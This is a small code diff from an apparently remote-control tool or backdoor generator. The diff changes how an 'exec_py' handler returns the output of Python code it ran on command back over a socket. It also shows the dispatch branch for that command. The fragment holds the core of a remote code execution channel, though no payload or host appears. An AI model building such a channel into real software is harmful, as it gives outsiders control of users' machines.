@@ -44,7 +44,7 @@ def exec_py(command):
         result.write(str(e) + '\\n')
     sys.stdout = old_stdout
     result_string = result.getvalue()
-    s.sendall(('[*]Result of code : \\n\\n' + result_string).encode())
+    send_all(s,'[*]Result of code : \\n\\n' + result_string)
 ''')
         config.logics.append('''
             elif command == "exec_py":
